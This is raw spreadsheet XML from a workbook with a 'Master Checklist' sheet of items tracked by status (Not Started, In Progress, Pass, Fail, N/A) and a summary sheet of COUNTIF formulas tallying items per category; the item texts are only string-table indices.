        <v>16</v>
      </c>
      <c r="H262" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I262" s="13"/>
    </row>
    <row r="263" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A263" s="12" t="s">
        <v>1279</v>
      </c>
      <c r="B263" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C263" s="13" t="s">
        <v>1280</v>
      </c>
      <c r="D263" s="13" t="s">
        <v>1281</v>
      </c>
      <c r="E263" s="13" t="s">
        <v>1282</v>
      </c>
      <c r="F263" s="13" t="s">
        <v>503</v>
      </c>
      <c r="G263" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H263" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I263" s="13"/>
    </row>
    <row r="264" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A264" s="12" t="s">
        <v>1283</v>
      </c>
      <c r="B264" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C264" s="13" t="s">
        <v>1284</v>
      </c>
      <c r="D264" s="13" t="s">
        <v>1285</v>
      </c>
      <c r="E264" s="13" t="s">
        <v>1286</v>
      </c>
      <c r="F264" s="13" t="s">
        <v>1287</v>
      </c>
      <c r="G264" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H264" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I264" s="13"/>
    </row>
    <row r="265" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A265" s="12" t="s">
        <v>1288</v>
      </c>
      <c r="B265" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C265" s="13" t="s">
        <v>1289</v>
      </c>
      <c r="D265" s="13" t="s">
        <v>1290</v>
      </c>
      <c r="E265" s="13" t="s">
        <v>1291</v>
      </c>
      <c r="F265" s="13" t="s">
        <v>1292</v>
      </c>
      <c r="G265" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H265" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I265" s="13"/>
    </row>
    <row r="266" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A266" s="12" t="s">
        <v>1293</v>
      </c>
      <c r="B266" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C266" s="13" t="s">
        <v>1294</v>
      </c>
      <c r="D266" s="13" t="s">
        <v>1295</v>
      </c>
      <c r="E266" s="13" t="s">
        <v>1296</v>
      </c>
      <c r="F266" s="13" t="s">
        <v>1297</v>
      </c>
      <c r="G266" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H266" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I266" s="13"/>
    </row>
    <row r="267" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A267" s="12" t="s">
        <v>1298</v>
      </c>
      <c r="B267" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C267" s="13" t="s">
        <v>1299</v>
      </c>
      <c r="D267" s="13" t="s">
        <v>1300</v>
      </c>
      <c r="E267" s="13" t="s">
        <v>1301</v>
      </c>
      <c r="F267" s="13" t="s">
        <v>1302</v>
      </c>
      <c r="G267" s="18" t="s">
        <v>16</v>
      </c>
      <c r="H267" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I267" s="13"/>
    </row>
    <row r="268" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A268" s="12" t="s">
        <v>1303</v>
      </c>
      <c r="B268" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C268" s="13" t="s">
        <v>1304</v>
      </c>
      <c r="D268" s="13" t="s">
        <v>1305</v>
      </c>
      <c r="E268" s="13" t="s">
        <v>1306</v>
      </c>
      <c r="F268" s="13" t="s">
        <v>560</v>
      </c>
      <c r="G268" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H268" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I268" s="13"/>
    </row>
    <row r="269" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A269" s="12" t="s">
        <v>1307</v>
      </c>
      <c r="B269" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C269" s="13" t="s">
        <v>1308</v>
      </c>
      <c r="D269" s="13" t="s">
        <v>1309</v>
      </c>
      <c r="E269" s="13" t="s">
        <v>1310</v>
      </c>
      <c r="F269" s="13" t="s">
        <v>334</v>
      </c>
      <c r="G269" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H269" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I269" s="13"/>
    </row>
    <row r="270" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A270" s="12" t="s">
        <v>1311</v>
      </c>
      <c r="B270" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="C270" s="13" t="s">
        <v>1312</v>
      </c>
      <c r="D270" s="13" t="s">
        <v>1313</v>
      </c>
      <c r="E270" s="13" t="s">
        <v>1314</v>
      </c>
      <c r="F270" s="13" t="s">
        <v>1315</v>
      </c>
      <c r="G270" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H270" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I270" s="13"/>
    </row>
    <row r="271" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A271" s="12" t="s">
        <v>1316</v>
      </c>
      <c r="B271" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C271" s="13" t="s">
        <v>1318</v>
      </c>
      <c r="D271" s="13" t="s">
        <v>1319</v>
      </c>
      <c r="E271" s="13" t="s">
        <v>1320</v>
      </c>
      <c r="F271" s="13" t="s">
        <v>125</v>
      </c>
      <c r="G271" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H271" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I271" s="13"/>
    </row>
    <row r="272" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A272" s="12" t="s">
        <v>1321</v>
      </c>
      <c r="B272" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C272" s="13" t="s">
        <v>1322</v>
      </c>
      <c r="D272" s="13" t="s">
        <v>1323</v>
      </c>
      <c r="E272" s="13" t="s">
        <v>1324</v>
      </c>
      <c r="F272" s="13" t="s">
        <v>1325</v>
      </c>
      <c r="G272" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H272" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I272" s="13"/>
    </row>
    <row r="273" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A273" s="12" t="s">
        <v>1326</v>
      </c>
      <c r="B273" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C273" s="13" t="s">
        <v>1327</v>
      </c>
      <c r="D273" s="13" t="s">
        <v>1328</v>
      </c>
      <c r="E273" s="13" t="s">
        <v>1329</v>
      </c>
      <c r="F273" s="13" t="s">
        <v>415</v>
      </c>
      <c r="G273" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H273" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I273" s="13"/>
    </row>
    <row r="274" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A274" s="12" t="s">
        <v>1330</v>
      </c>
      <c r="B274" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C274" s="13" t="s">
        <v>1331</v>
      </c>
      <c r="D274" s="13" t="s">
        <v>1332</v>
      </c>
      <c r="E274" s="13" t="s">
        <v>1333</v>
      </c>
      <c r="F274" s="13" t="s">
        <v>1334</v>
      </c>
      <c r="G274" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H274" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I274" s="13"/>
    </row>
    <row r="275" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A275" s="12" t="s">
        <v>1335</v>
      </c>
      <c r="B275" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C275" s="13" t="s">
        <v>1336</v>
      </c>
      <c r="D275" s="13" t="s">
        <v>1337</v>
      </c>
      <c r="E275" s="13" t="s">
        <v>1338</v>
      </c>
      <c r="F275" s="13" t="s">
        <v>125</v>
      </c>
      <c r="G275" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H275" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I275" s="13"/>
    </row>
    <row r="276" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A276" s="12" t="s">
        <v>1339</v>
      </c>
      <c r="B276" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C276" s="13" t="s">
        <v>1340</v>
      </c>
      <c r="D276" s="13" t="s">
        <v>1341</v>
      </c>
      <c r="E276" s="13" t="s">
        <v>1342</v>
      </c>
      <c r="F276" s="13" t="s">
        <v>1343</v>
      </c>
      <c r="G276" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H276" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I276" s="13"/>
    </row>
    <row r="277" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A277" s="12" t="s">
        <v>1344</v>
      </c>
      <c r="B277" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="C277" s="13" t="s">
        <v>1345</v>
      </c>
      <c r="D277" s="13" t="s">
        <v>1346</v>
      </c>
      <c r="E277" s="13" t="s">
        <v>1347</v>
      </c>
      <c r="F277" s="13" t="s">
        <v>1348</v>
      </c>
      <c r="G277" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H277" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I277" s="13"/>
    </row>
    <row r="278" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A278" s="12" t="s">
        <v>1349</v>
      </c>
      <c r="B278" s="13" t="s">
        <v>1350</v>
      </c>
      <c r="C278" s="13" t="s">
        <v>1351</v>
      </c>
      <c r="D278" s="13" t="s">
        <v>1352</v>
      </c>
      <c r="E278" s="13" t="s">
        <v>1353</v>
      </c>
      <c r="F278" s="13" t="s">
        <v>1354</v>
      </c>
      <c r="G278" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H278" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I278" s="13"/>
    </row>
    <row r="279" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A279" s="12" t="s">
        <v>1355</v>
      </c>
      <c r="B279" s="13" t="s">
        <v>1350</v>
      </c>
      <c r="C279" s="13" t="s">
        <v>1356</v>
      </c>
      <c r="D279" s="13" t="s">
        <v>1357</v>
      </c>
      <c r="E279" s="13" t="s">
        <v>1358</v>
      </c>
      <c r="F279" s="13" t="s">
        <v>1354</v>
      </c>
      <c r="G279" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H279" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I279" s="13"/>
    </row>
    <row r="280" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A280" s="12" t="s">
        <v>1359</v>
      </c>
      <c r="B280" s="13" t="s">
        <v>1350</v>
      </c>
      <c r="C280" s="13" t="s">
        <v>1360</v>
      </c>
      <c r="D280" s="13" t="s">
        <v>1361</v>
      </c>
      <c r="E280" s="13" t="s">
        <v>1362</v>
      </c>
      <c r="F280" s="13" t="s">
        <v>1363</v>
      </c>
      <c r="G280" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H280" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I280" s="13"/>
    </row>
    <row r="281" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A281" s="12" t="s">
        <v>1364</v>
      </c>
      <c r="B281" s="13" t="s">
        <v>1350</v>
      </c>
      <c r="C281" s="13" t="s">
        <v>1365</v>
      </c>
      <c r="D281" s="13" t="s">
        <v>1366</v>
      </c>
      <c r="E281" s="13" t="s">
        <v>1367</v>
      </c>
      <c r="F281" s="13" t="s">
        <v>1354</v>
      </c>
      <c r="G281" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H281" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I281" s="13"/>
    </row>
    <row r="282" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A282" s="12" t="s">
        <v>1368</v>
      </c>
      <c r="B282" s="13" t="s">
        <v>1350</v>
      </c>
      <c r="C282" s="13" t="s">
        <v>1369</v>
      </c>
      <c r="D282" s="13" t="s">
        <v>1370</v>
      </c>
      <c r="E282" s="13" t="s">
        <v>1371</v>
      </c>
      <c r="F282" s="13" t="s">
        <v>1372</v>
      </c>
      <c r="G282" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H282" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I282" s="13"/>
    </row>
    <row r="283" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A283" s="12" t="s">
        <v>1373</v>
      </c>
      <c r="B283" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="C283" s="13" t="s">
        <v>1375</v>
      </c>
      <c r="D283" s="13" t="s">
        <v>1376</v>
      </c>
      <c r="E283" s="13" t="s">
        <v>1377</v>
      </c>
      <c r="F283" s="13" t="s">
        <v>140</v>
      </c>
      <c r="G283" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H283" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I283" s="13"/>
    </row>
    <row r="284" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A284" s="12" t="s">
        <v>1378</v>
      </c>
      <c r="B284" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="C284" s="13" t="s">
        <v>693</v>
      </c>
      <c r="D284" s="13" t="s">
        <v>1379</v>
      </c>
      <c r="E284" s="13" t="s">
        <v>1380</v>
      </c>
      <c r="F284" s="13" t="s">
        <v>1381</v>
      </c>
      <c r="G284" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H284" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I284" s="13"/>
    </row>
    <row r="285" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A285" s="12" t="s">
        <v>1382</v>
      </c>
      <c r="B285" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="C285" s="13" t="s">
        <v>1383</v>
      </c>
      <c r="D285" s="13" t="s">
        <v>1384</v>
      </c>
      <c r="E285" s="13" t="s">
        <v>1385</v>
      </c>
      <c r="F285" s="13" t="s">
        <v>1386</v>
      </c>
      <c r="G285" s="18" t="s">
        <v>16</v>
      </c>
      <c r="H285" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I285" s="13"/>
    </row>
    <row r="286" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A286" s="12" t="s">
        <v>1387</v>
      </c>
      <c r="B286" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="C286" s="13" t="s">
        <v>1388</v>
      </c>
      <c r="D286" s="13" t="s">
        <v>1389</v>
      </c>
      <c r="E286" s="13" t="s">
        <v>1390</v>
      </c>
      <c r="F286" s="13" t="s">
        <v>1391</v>
      </c>
      <c r="G286" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H286" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I286" s="13"/>
    </row>
    <row r="287" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A287" s="12" t="s">
        <v>1392</v>
      </c>
      <c r="B287" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="C287" s="13" t="s">
        <v>1393</v>
      </c>
      <c r="D287" s="13" t="s">
        <v>1394</v>
      </c>
      <c r="E287" s="13" t="s">
        <v>1395</v>
      </c>
      <c r="F287" s="13" t="s">
        <v>140</v>
      </c>
      <c r="G287" s="17" t="s">
        <v>19</v>
      </c>
      <c r="H287" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I287" s="13"/>
    </row>
    <row r="288" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A288" s="12" t="s">
        <v>1396</v>
      </c>
      <c r="B288" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="C288" s="13" t="s">
        <v>1397</v>
      </c>
      <c r="D288" s="13" t="s">
        <v>1398</v>
      </c>
      <c r="E288" s="13" t="s">
        <v>1399</v>
      </c>
      <c r="F288" s="13" t="s">
        <v>140</v>
      </c>
      <c r="G288" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H288" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I288" s="13"/>
    </row>
    <row r="289" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A289" s="12" t="s">
        <v>1400</v>
      </c>
      <c r="B289" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C289" s="13" t="s">
        <v>1402</v>
      </c>
      <c r="D289" s="13" t="s">
        <v>1403</v>
      </c>
      <c r="E289" s="13" t="s">
        <v>1404</v>
      </c>
      <c r="F289" s="13" t="s">
        <v>731</v>
      </c>
      <c r="G289" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H289" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I289" s="13"/>
    </row>
    <row r="290" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A290" s="12" t="s">
        <v>1405</v>
      </c>
      <c r="B290" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C290" s="13" t="s">
        <v>1406</v>
      </c>
      <c r="D290" s="13" t="s">
        <v>1407</v>
      </c>
      <c r="E290" s="13" t="s">
        <v>1408</v>
      </c>
      <c r="F290" s="13" t="s">
        <v>1273</v>
      </c>
      <c r="G290" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H290" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I290" s="13"/>
    </row>
    <row r="291" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A291" s="12" t="s">
        <v>1409</v>
      </c>
      <c r="B291" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C291" s="13" t="s">
        <v>1410</v>
      </c>
      <c r="D291" s="13" t="s">
        <v>1411</v>
      </c>
      <c r="E291" s="13" t="s">
        <v>1412</v>
      </c>
      <c r="F291" s="13" t="s">
        <v>1413</v>
      </c>
      <c r="G291" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H291" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I291" s="13"/>
    </row>
    <row r="292" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A292" s="12" t="s">
        <v>1414</v>
      </c>
      <c r="B292" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C292" s="13" t="s">
        <v>1415</v>
      </c>
      <c r="D292" s="13" t="s">
        <v>1416</v>
      </c>
      <c r="E292" s="13" t="s">
        <v>1417</v>
      </c>
      <c r="F292" s="13" t="s">
        <v>1418</v>
      </c>
      <c r="G292" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H292" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I292" s="13"/>
    </row>
    <row r="293" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A293" s="12" t="s">
        <v>1419</v>
      </c>
      <c r="B293" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C293" s="13" t="s">
        <v>1420</v>
      </c>
      <c r="D293" s="13" t="s">
        <v>1421</v>
      </c>
      <c r="E293" s="13" t="s">
        <v>1422</v>
      </c>
      <c r="F293" s="13" t="s">
        <v>1423</v>
      </c>
      <c r="G293" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H293" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I293" s="13"/>
    </row>
    <row r="294" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A294" s="12" t="s">
        <v>1424</v>
      </c>
      <c r="B294" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C294" s="13" t="s">
        <v>1425</v>
      </c>
      <c r="D294" s="13" t="s">
        <v>1426</v>
      </c>
      <c r="E294" s="13" t="s">
        <v>1427</v>
      </c>
      <c r="F294" s="13" t="s">
        <v>1428</v>
      </c>
      <c r="G294" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H294" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I294" s="13"/>
    </row>
    <row r="295" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A295" s="12" t="s">
        <v>1429</v>
      </c>
      <c r="B295" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C295" s="13" t="s">
        <v>1430</v>
      </c>
      <c r="D295" s="13" t="s">
        <v>1431</v>
      </c>
      <c r="E295" s="13" t="s">
        <v>1432</v>
      </c>
      <c r="F295" s="13" t="s">
        <v>1433</v>
      </c>
      <c r="G295" s="18" t="s">
        <v>16</v>
      </c>
      <c r="H295" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I295" s="13"/>
    </row>
    <row r="296" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A296" s="12" t="s">
        <v>1434</v>
      </c>
      <c r="B296" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C296" s="13" t="s">
        <v>1435</v>
      </c>
      <c r="D296" s="13" t="s">
        <v>1436</v>
      </c>
      <c r="E296" s="13" t="s">
        <v>1437</v>
      </c>
      <c r="F296" s="13" t="s">
        <v>1438</v>
      </c>
      <c r="G296" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H296" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I296" s="13"/>
    </row>
    <row r="297" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A297" s="12" t="s">
        <v>1439</v>
      </c>
      <c r="B297" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C297" s="13" t="s">
        <v>1440</v>
      </c>
      <c r="D297" s="13" t="s">
        <v>1441</v>
      </c>
      <c r="E297" s="13" t="s">
        <v>1442</v>
      </c>
      <c r="F297" s="13" t="s">
        <v>1443</v>
      </c>
      <c r="G297" s="18" t="s">
        <v>16</v>
      </c>
      <c r="H297" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I297" s="13"/>
    </row>
    <row r="298" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A298" s="12" t="s">
        <v>1444</v>
      </c>
      <c r="B298" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="C298" s="13" t="s">
        <v>1445</v>
      </c>
      <c r="D298" s="13" t="s">
        <v>1446</v>
      </c>
      <c r="E298" s="13" t="s">
        <v>1447</v>
      </c>
      <c r="F298" s="13" t="s">
        <v>1448</v>
      </c>
      <c r="G298" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H298" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I298" s="13"/>
    </row>
  </sheetData>
  <autoFilter ref="A3:I298"/>
  <mergeCells count="2">
    <mergeCell ref="A1:I1"/>
    <mergeCell ref="A2:I2"/>
  </mergeCells>
  <conditionalFormatting sqref="A4:I298">
    <cfRule type="expression" priority="2" aboveAverage="0" equalAverage="0" bottom="0" percent="0" rank="0" text="" dxfId="9">
      <formula>$H4="Pass"</formula>
    </cfRule>
    <cfRule type="expression" priority="3" aboveAverage="0" equalAverage="0" bottom="0" percent="0" rank="0" text="" dxfId="10">
      <formula>$H4="Fail"</formula>
    </cfRule>
    <cfRule type="expression" priority="4" aboveAverage="0" equalAverage="0" bottom="0" percent="0" rank="0" text="" dxfId="11">
      <formula>$H4="In Progress"</formula>
    </cfRule>
    <cfRule type="expression" priority="5" aboveAverage="0" equalAverage="0" bottom="0" percent="0" rank="0" text="" dxfId="12">
      <formula>$H4="N/A"</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="1">
    <dataValidation allowBlank="true" errorStyle="stop" operator="between" showDropDown="false" showErrorMessage="false" showInputMessage="false" sqref="H4:H298" type="list">
      <formula1>"Not Started,In Progress,Pass,Fail,N/A"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4"/>
  </cols>
  <sheetData>
    <row r="1" customFormat="false" ht="24.45" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A1" s="1" t="s">
        <v>1449</v>
      </c>
      <c r="B1" s="1"/>
      <c r="C1" s="1"/>
      <c r="D1" s="1"/>
      <c r="E1" s="1"/>
      <c r="F1" s="1"/>
      <c r="G1" s="1"/>
    </row>
    <row r="3" customFormat="false" ht="24" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A3" s="11" t="s">
        <v>26</v>
      </c>
      <c r="B3" s="11" t="s">
        <v>1450</v>
      </c>
      <c r="C3" s="11" t="s">
        <v>40</v>
      </c>
      <c r="D3" s="11" t="s">
        <v>1451</v>
      </c>
      <c r="E3" s="11" t="s">
        <v>1452</v>
      </c>
      <c r="F3" s="11" t="s">
        <v>1453</v>
      </c>
      <c r="G3" s="11" t="s">
        <v>1454</v>
      </c>
    </row>
    <row r="4" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A4" s="13" t="s">
        <v>35</v>
      </c>
      <c r="B4" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A4)</f>
        <v>27</v>
      </c>
      <c r="C4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A4,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>27</v>
      </c>
      <c r="D4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A4,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A4,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A4,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G4" s="20" t="n">
        <f aca="false">IF(B4=0,0,(E4+F4)/B4)</f>
        <v>0</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="13" t="s">
        <v>172</v>
      </c>
      <c r="B5" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A5)</f>
        <v>32</v>
      </c>
      <c r="C5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A5,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>32</v>
      </c>
      <c r="D5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A5,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A5,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A5,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G5" s="20" t="n">
        <f aca="false">IF(B5=0,0,(E5+F5)/B5)</f>
        <v>0</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="13" t="s">
        <v>330</v>
      </c>
      <c r="B6" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A6)</f>
        <v>12</v>
      </c>
      <c r="C6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A6,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>12</v>
      </c>
      <c r="D6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A6,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A6,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A6,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G6" s="20" t="n">
        <f aca="false">IF(B6=0,0,(E6+F6)/B6)</f>
        <v>0</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="13" t="s">
        <v>385</v>
      </c>
      <c r="B7" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A7)</f>
        <v>10</v>
      </c>
      <c r="C7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A7,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>10</v>
      </c>
      <c r="D7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A7,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A7,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
